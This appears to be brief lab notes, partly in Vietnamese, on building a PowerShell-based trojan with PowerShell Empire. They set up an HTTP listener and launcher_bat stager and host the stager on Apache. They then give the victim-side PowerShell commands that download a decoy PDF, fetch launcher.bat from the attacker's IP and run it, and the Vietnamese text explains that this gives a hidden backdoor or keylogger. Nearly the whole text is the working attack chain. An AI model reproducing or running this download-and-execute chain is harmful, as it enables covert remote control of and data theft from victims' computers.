[Demo](https://www.youtube.com/watch?v=-ijzoEiw1Cw)

powershell-empire server 
powershell-empire client

uselistener http
set Host 192.168.202.159
set Port 8080
execute

usestager windows/launcher_bat
set Listener http

execute

sudo service apache2 start
sudo service apache2 status
sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat /var/www/html/launcher.bat

192.168.202.159/launcher.bat

cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://dotchuoinon.files.wordpress.com/2012/07/ton-tu-binh-phap.pdf' -OutFile Tontu.pdf"
Tontu.pdf
Powershell -Command "Invoke-WebRequest 'http://http://192.168.202.159/launcher.bat' -OutFile Sun_Zu.bat"
Sun_Zu.bat

Kịch bản 1 tạo 1 trojan sử dụng Powershell
Trojan là một tập tin có giao diện trông giống như một tệp hình ảnh hoặc pdf bình thường
nhưng khi được thực thi, nó sẽ chạy các mã độc ở chế độ nền như 1 backdoor hoặc 1 keylogger

Về cơ bản, đây là một lệnh tải xuống và tiếp theo đó là lệnh tự động chạy file

